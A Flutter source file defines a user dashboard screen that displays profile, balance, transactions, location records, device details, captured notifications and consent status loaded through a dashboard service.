import 'package:flutter/material.dart';
import '../service/dashboard_service.dart';

class UserDashboard extends StatefulWidget {
  const UserDashboard({Key? key}) : super(key: key);

  @override
  State<UserDashboard> createState() => _UserDashboardState();
}

class _UserDashboardState extends State<UserDashboard> {
  Map<String, dynamic>? _dashboardData;
  Map<String, dynamic>? _dashboardStats;
  bool _isLoading = true;
  String? _error;

  @override
  void initState() {
    super.initState();
    _loadDashboardData();
  }

  Future<void> _loadDashboardData() async {
    setState(() {
      _isLoading = true;
      _error = null;
    });

    try {
      final data = await DashboardService.getUserDashboardData();
      final stats = await DashboardService.getDashboardStats();
      
      setState(() {
        _dashboardData = data;
        _dashboardStats = stats;
        _isLoading = false;
      });
    } catch (e) {
      setState(() {
        _error = e.toString();
        _isLoading = false;
      });
    }
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: Colors.black,
      appBar: AppBar(
        title: const Text('User Dashboard'),
        backgroundColor: Colors.purple,
        foregroundColor: Colors.white,
        actions: [
          IconButton(
            icon: const Icon(Icons.refresh),
            onPressed: _loadDashboardData,
          ),
        ],
      ),
      body: _isLoading
          ? const Center(child: CircularProgressIndicator(color: Colors.purple))
          : _error != null
              ? _buildErrorWidget()
              : _buildDashboardContent(),
    );
  }

  Widget _buildErrorWidget() {
    return Center(
      child: Column(
        mainAxisAlignment: MainAxisAlignment.center,
        children: [
          const Icon(Icons.error, color: Colors.red, size: 64),
          const SizedBox(height: 16),
          Text(
            'Error: $_error',
            style: const TextStyle(color: Colors.white),
            textAlign: TextAlign.center,
          ),
          const SizedBox(height: 16),
          ElevatedButton(
            onPressed: _loadDashboardData,
            child: const Text('Retry'),
          ),
        ],
      ),
    );
  }

  Widget _buildDashboardContent() {
    if (_dashboardData == null) return const SizedBox();

    return SingleChildScrollView(
      padding: const EdgeInsets.all(16),
      child: Column(
        crossAxisAlignment: CrossAxisAlignment.start,
        children: [
          _buildUserProfileCard(),
          const SizedBox(height: 16),
          _buildStatsOverview(),
          const SizedBox(height: 16),
          _buildBalanceCard(),
          const SizedBox(height: 16),
          _buildRecentTransactions(),
          const SizedBox(height: 16),
          _buildLocationDataCard(),
          const SizedBox(height: 16),
          _buildDeviceInfoCard(),
          const SizedBox(height: 16),
          _buildNotificationDataCard(),
          const SizedBox(height: 16),
          _buildConsentDataCard(),
        ],
      ),
    );
  }

  Widget _buildUserProfileCard() {
    final userProfile = _dashboardData!['userProfile'] as Map<String, dynamic>?;
    if (userProfile == null) return const SizedBox();

    return Card(
      color: Colors.grey[900],
      child: Padding(
        padding: const EdgeInsets.all(16),
        child: Column(
          crossAxisAlignment: CrossAxisAlignment.start,
          children: [
            Row(
              children: [
                CircleAvatar(
                  backgroundColor: Colors.purple,
                  child: Text(
                    userProfile['fullName']?.toString().substring(0, 1).toUpperCase() ?? 'U',
                    style: const TextStyle(color: Colors.white, fontWeight: FontWeight.bold),
                  ),
                ),
                const SizedBox(width: 16),
                Expanded(
                  child: Column(
                    crossAxisAlignment: CrossAxisAlignment.start,
                    children: [
                      Text(
                        userProfile['fullName'] ?? 'Unknown User',
                        style: const TextStyle(
                          color: Colors.white,
                          fontSize: 18,
                          fontWeight: FontWeight.bold,
                        ),
                      ),
                      Text(
                        userProfile['email'] ?? '',
                        style: const TextStyle(color: Colors.white70),
                      ),
                    ],
                  ),
                ),
                Container(
                  padding: const EdgeInsets.symmetric(horizontal: 8, vertical: 4),
                  decoration: BoxDecoration(
                    color: userProfile['isActive'] == true ? Colors.green : Colors.red,
                    borderRadius: BorderRadius.circular(12),
                  ),
                  child: Text(
                    userProfile['isActive'] == true ? 'Active' : 'Inactive',
                    style: const TextStyle(color: Colors.white, fontSize: 12),
                  ),
                ),
              ],
            ),
            const SizedBox(height: 16),
            _buildInfoRow('Mobile', userProfile['mobileNumber'] ?? 'N/A'),
            _buildInfoRow('UPI ID', userProfile['upiId'] ?? 'N/A'),
            _buildInfoRow('Last Login', DashboardService.formatTimestamp(userProfile['lastLogin'])),
          ],
        ),
      ),
    );
  }

  Widget _buildStatsOverview() {
    if (_dashboardStats == null) return const SizedBox();

    return Card(
      color: Colors.grey[900],
      child: Padding(
        padding: const EdgeInsets.all(16),
        child: Column(
          crossAxisAlignment: CrossAxisAlignment.start,
          children: [
            const Text(
              'Overview',
              style: TextStyle(
                color: Colors.white,
                fontSize: 18,
                fontWeight: FontWeight.bold,
              ),
            ),
            const SizedBox(height: 16),
            Row(
              children: [
                Expanded(child: _buildStatCard('Total Transactions', _dashboardStats!['totalTransactions']?.toString() ?? '0', Icons.receipt)),
                const SizedBox(width: 8),
                Expanded(child: _buildStatCard('Location Records', _dashboardStats!['locationRecords']?.toString() ?? '0', Icons.location_on)),
              ],
            ),
            const SizedBox(height: 8),
            Row(
              children: [
                Expanded(child: _buildStatCard('Notifications', _dashboardStats!['notificationRecords']?.toString() ?? '0', Icons.notifications)),
                const SizedBox(width: 8),
                Expanded(child: _buildStatCard('Total Amount', DashboardService.formatCurrency(_dashboardStats!['totalTransactionAmount'] ?? 0), Icons.currency_rupee)),
              ],
            ),
          ],
        ),
      ),
    );
  }

  Widget _buildStatCard(String title, String value, IconData icon) {
    return Container(
      padding: const EdgeInsets.all(12),
      decoration: BoxDecoration(
        color: Colors.grey[800],
        borderRadius: BorderRadius.circular(8),
      ),
      child: Column(
        children: [
          Icon(icon, color: Colors.purple, size: 24),
          const SizedBox(height: 8),
          Text(
            value,
            style: const TextStyle(
              color: Colors.white,
              fontSize: 16,
              fontWeight: FontWeight.bold,
            ),
          ),
          Text(
            title,
            style: const TextStyle(color: Colors.white70, fontSize: 12),
            textAlign: TextAlign.center,
          ),
        ],
      ),
    );
  }

  Widget _buildBalanceCard() {
    final userBalance = _dashboardData!['userBalance'] as Map<String, dynamic>?;
    
    return Card(
      color: Colors.grey[900],
      child: Padding(
        padding: const EdgeInsets.all(16),
        child: Column(
          crossAxisAlignment: CrossAxisAlignment.start,
          children: [
            const Text(
              'Balance Information',
              style: TextStyle(
                color: Colors.white,
                fontSize: 18,
                fontWeight: FontWeight.bold,
              ),
            ),
            const SizedBox(height: 16),
            if (userBalance != null) ...[
              _buildInfoRow('Current Balance', DashboardService.formatCurrency(userBalance['balance'] ?? 0)),
              _buildInfoRow('Last Updated', DashboardService.formatTimestamp(userBalance['lastUpdated'])),
            ] else
              const Text(
                'No balance information available',
                style: TextStyle(color: Colors.white70),
              ),
          ],
        ),
      ),
    );
  }

  Widget _buildRecentTransactions() {
    final paymentTransactions = _dashboardData!['paymentTransactions'] as List<Map<String, dynamic>>? ?? [];
    final paymentHistory = _dashboardData!['paymentHistory'] as List<Map<String, dynamic>>? ?? [];
    
    final allTransactions = [...paymentTransactions, ...paymentHistory];
    allTransactions.sort((a, b) {
      final aTime = a['timestamp'];
      final bTime = b['timestamp'];
      if (aTime == null && bTime == null) return 0;
      if (aTime == null) return 1;
      if (bTime == null) return -1;
      return bTime.toString().compareTo(aTime.toString());
    });

    return Card(
      color: Colors.grey[900],
      child: Padding(
        padding: const EdgeInsets.all(16),
        child: Column(
          crossAxisAlignment: CrossAxisAlignment.start,
          children: [
            const Text(
              'Recent Transactions',
              style: TextStyle(
                color: Colors.white,
                fontSize: 18,
                fontWeight: FontWeight.bold,
              ),
            ),
            const SizedBox(height: 16),
            if (allTransactions.isEmpty)
              const Text(
                'No transactions found',
                style: TextStyle(color: Colors.white70),
              )
            else
              ...allTransactions.take(5).map((transaction) => _buildTransactionItem(transaction)),
          ],
        ),
      ),
    );
  }

  Widget _buildTransactionItem(Map<String, dynamic> transaction) {
    final title = transaction['title'] ?? transaction['name'] ?? 'Unknown';
    final amount = transaction['amount'] ?? '0';
    final status = transaction['status'] ?? 'Unknown';
    final timestamp = transaction['timestamp'];
    final source = transaction['source'] ?? '';

    return Container(
      margin: const EdgeInsets.only(bottom: 8),
      padding: const EdgeInsets.all(12),
      decoration: BoxDecoration(
        color: Colors.grey[800],
        borderRadius: BorderRadius.circular(8),
      ),
      child: Row(
        children: [
          Container(
            width: 40,
            height: 40,
            decoration: BoxDecoration(
              color: status == 'Success' ? Colors.green : Colors.orange,
              borderRadius: BorderRadius.circular(20),
            ),
            child: Icon(
              status == 'Success' ? Icons.check : Icons.pending,
              color: Colors.white,
              size: 20,
            ),
          ),
          const SizedBox(width: 12),
          Expanded(
            child: Column(
              crossAxisAlignment: CrossAxisAlignment.start,
              children: [
                Text(
                  title,
                  style: const TextStyle(color: Colors.white, fontWeight: FontWeight.bold),
                ),
                Text(
                  DashboardService.formatTimestamp(timestamp),
                  style: const TextStyle(color: Colors.white70, fontSize: 12),
                ),
                Text(
                  source,
                  style: const TextStyle(color: Colors.purple, fontSize: 10),
                ),
              ],
            ),
          ),
          Column(
            crossAxisAlignment: CrossAxisAlignment.end,
            children: [
              Text(
                DashboardService.formatCurrency(amount),
                style: const TextStyle(
                  color: Colors.white,
                  fontWeight: FontWeight.bold,
                ),
              ),
              Text(
                status,
                style: TextStyle(
                  color: status == 'Success' ? Colors.green : Colors.orange,
                  fontSize: 12,
                ),
              ),
            ],
          ),
        ],
      ),
    );
  }

  Widget _buildLocationDataCard() {
    final locationData = _dashboardData!['locationData'] as List<Map<String, dynamic>>? ?? [];

    return Card(
      color: Colors.grey[900],
      child: Padding(
        padding: const EdgeInsets.all(16),
        child: Column(
          crossAxisAlignment: CrossAxisAlignment.start,
          children: [
            const Text(
              'Location Data',
              style: TextStyle(
                color: Colors.white,
                fontSize: 18,
                fontWeight: FontWeight.bold,
              ),
            ),
            const SizedBox(height: 16),
            if (locationData.isEmpty)
              const Text(
                'No location data available',
                style: TextStyle(color: Colors.white70),
              )
            else
              ...locationData.take(3).map((location) => _buildLocationItem(location)),
          ],
        ),
      ),
    );
  }

  Widget _buildLocationItem(Map<String, dynamic> location) {
    final locationInfo = location['locationData'] as Map<String, dynamic>? ?? {};
    final latitude = locationInfo['latitude']?.toString() ?? 'N/A';
    final longitude = locationInfo['longitude']?.toString() ?? 'N/A';
    final accuracy = locationInfo['accuracy']?.toString() ?? 'N/A';
    final timestamp = location['capturedAt'];

    return Container(
      margin: const EdgeInsets.only(bottom: 8),
      padding: const EdgeInsets.all(12),
      decoration: BoxDecoration(
        color: Colors.grey[800],
        borderRadius: BorderRadius.circular(8),
      ),
      child: Column(
        crossAxisAlignment: CrossAxisAlignment.start,
        children: [
          Row(
            children: [
              const Icon(Icons.location_on, color: Colors.purple, size: 20),
              const SizedBox(width: 8),
              Text(
                'Lat: ${latitude.length > 10 ? latitude.substring(0, 10) : latitude}',
                style: const TextStyle(color: Colors.white),
              ),
              const SizedBox(width: 16),
              Text(
                'Lng: ${longitude.length > 10 ? longitude.substring(0, 10) : longitude}',
                style: const TextStyle(color: Colors.white),
              ),
            ],
          ),
          const SizedBox(height: 4),
          Text(
            'Accuracy: ${accuracy}m • ${DashboardService.formatTimestamp(timestamp)}',
            style: const TextStyle(color: Colors.white70, fontSize: 12),
          ),
        ],
      ),
    );
  }

  Widget _buildDeviceInfoCard() {
    final deviceInfo = _dashboardData!['deviceInfo'] as List<Map<String, dynamic>>? ?? [];

    return Card(
      color: Colors.grey[900],
      child: Padding(
        padding: const EdgeInsets.all(16),
        child: Column(
          crossAxisAlignment: CrossAxisAlignment.start,
          children: [
            const Text(
              'Device Information',
              style: TextStyle(
                color: Colors.white,
                fontSize: 18,
                fontWeight: FontWeight.bold,
              ),
            ),
            const SizedBox(height: 16),
            if (deviceInfo.isEmpty)
              const Text(
                'No device information available',
                style: TextStyle(color: Colors.white70),
              )
            else
              _buildDeviceItem(deviceInfo.first),
          ],
        ),
      ),
    );
  }

  Widget _buildDeviceItem(Map<String, dynamic> device) {
    final deviceData = device['deviceInfo'] as Map<String, dynamic>? ?? {};
    final platform = deviceData['platform'] ?? 'Unknown';
    final model = deviceData['model'] ?? 'Unknown';
    final manufacturer = deviceData['manufacturer'] ?? 'Unknown';
    final timestamp = device['capturedAt'];

    return Container(
      padding: const EdgeInsets.all(12),
      decoration: BoxDecoration(
        color: Colors.grey[800],
        borderRadius: BorderRadius.circular(8),
      ),
      child: Column(
        crossAxisAlignment: CrossAxisAlignment.start,
        children: [
          _buildInfoRow('Platform', platform),
          _buildInfoRow('Model', model),
          _buildInfoRow('Manufacturer', manufacturer),
          _buildInfoRow('Last Updated', DashboardService.formatTimestamp(timestamp)),
        ],
      ),
    );
  }

  Widget _buildNotificationDataCard() {
    final notificationData = _dashboardData!['notificationData'] as List<Map<String, dynamic>>? ?? [];

    return Card(
      color: Colors.grey[900],
      child: Padding(
        padding: const EdgeInsets.all(16),
        child: Column(
          crossAxisAlignment: CrossAxisAlignment.start,
          children: [
            const Text(
              'Recent Notifications',
              style: TextStyle(
                color: Colors.white,
                fontSize: 18,
                fontWeight: FontWeight.bold,
              ),
            ),
            const SizedBox(height: 16),
            if (notificationData.isEmpty)
              const Text(
                'No notification data available',
                style: TextStyle(color: Colors.white70),
              )
            else
              ...notificationData.take(3).map((notification) => _buildNotificationItem(notification)),
          ],
        ),
      ),
    );
  }

  Widget _buildNotificationItem(Map<String, dynamic> notification) {
    final notificationInfo = notification['notificationData'] as Map<String, dynamic>? ?? {};
    final title = notificationInfo['title'] ?? 'No Title';
    final text = notificationInfo['text'] ?? 'No Content';
    final packageName = notificationInfo['packageName'] ?? 'Unknown App';
    final timestamp = notification['capturedAt'];

    return Container(
      margin: const EdgeInsets.only(bottom: 8),
      padding: const EdgeInsets.all(12),
      decoration: BoxDecoration(
        color: Colors.grey[800],
        borderRadius: BorderRadius.circular(8),
      ),
      child: Column(
        crossAxisAlignment: CrossAxisAlignment.start,
        children: [
          Text(
            title,
            style: const TextStyle(color: Colors.white, fontWeight: FontWeight.bold),
            maxLines: 1,
            overflow: TextOverflow.ellipsis,
          ),
          const SizedBox(height: 4),
          Text(
            text,
            style: const TextStyle(color: Colors.white70),
            maxLines: 2,
            overflow: TextOverflow.ellipsis,
          ),
          const SizedBox(height: 4),
          Text(
            '$packageName • ${DashboardService.formatTimestamp(timestamp)}',
            style: const TextStyle(color: Colors.purple, fontSize: 12),
          ),
        ],
      ),
    );
  }

  Widget _buildConsentDataCard() {
    final consentData = _dashboardData!['consentData'] as List<Map<String, dynamic>>? ?? [];

    return Card(
      color: Colors.grey[900],
      child: Padding(
        padding: const EdgeInsets.all(16),
        child: Column(
          crossAxisAlignment: CrossAxisAlignment.start,
          children: [
            const Text(
              'Consent & Permissions',
              style: TextStyle(
                color: Colors.white,
                fontSize: 18,
                fontWeight: FontWeight.bold,
              ),
            ),
            const SizedBox(height: 16),
            if (consentData.isEmpty)
              const Text(
                'No consent data available',
                style: TextStyle(color: Colors.white70),
              )
            else
              _buildConsentItem(consentData.first),
          ],
        ),
      ),
    );
  }

  Widget _buildConsentItem(Map<String, dynamic> consent) {
    final permissions = consent['permissions'] as Map<String, dynamic>? ?? {};
    final consentGiven = consent['consentGiven'] ?? false;
    final timestamp = consent['timestamp'];

    return Container(
      padding: const EdgeInsets.all(12),
      decoration: BoxDecoration(
        color: Colors.grey[800],
        borderRadius: BorderRadius.circular(8),
      ),
      child: Column(
        crossAxisAlignment: CrossAxisAlignment.start,
        children: [
          Row(
            children: [
              Icon(
                consentGiven ? Icons.check_circle : Icons.cancel,
                color: consentGiven ? Colors.green : Colors.red,
                size: 20,
              ),
              const SizedBox(width: 8),
              Text(
                consentGiven ? 'Consent Given' : 'Consent Denied',
                style: TextStyle(
                  color: consentGiven ? Colors.green : Colors.red,
                  fontWeight: FontWeight.bold,
                ),
              ),
            ],
          ),
          const SizedBox(height: 8),
          ...permissions.entries.map((entry) => Padding(
            padding: const EdgeInsets.symmetric(vertical: 2),
            child: Row(
              children: [
                Icon(
                  entry.value == true ? Icons.check : Icons.close,
                  color: entry.value == true ? Colors.green : Colors.red,
                  size: 16,
                ),
                const SizedBox(width: 8),
                Text(
                  entry.key.toUpperCase(),
                  style: const TextStyle(color: Colors.white70, fontSize: 12),
                ),
              ],
            ),
          )),
          const SizedBox(height: 8),
          Text(
            'Updated: ${DashboardService.formatTimestamp(timestamp)}',
            style: const TextStyle(color: Colors.white70, fontSize: 12),
          ),
        ],
      ),
    );
  }

  Widget _buildInfoRow(String label, String value) {
    return Padding(
      padding: const EdgeInsets.symmetric(vertical: 4),
      child: Row(
        crossAxisAlignment: CrossAxisAlignment.start,
        children: [
          SizedBox(
            width: 100,
            child: Text(
              label,
              style: const TextStyle(color: Colors.white70, fontSize: 14),
            ),
          ),
          const Text(': ', style: TextStyle(color: Colors.white70)),
          Expanded(
            child: Text(
              value,
              style: const TextStyle(color: Colors.white, fontSize: 14),
            ),
          ),
        ],
      ),
    );
  }
}
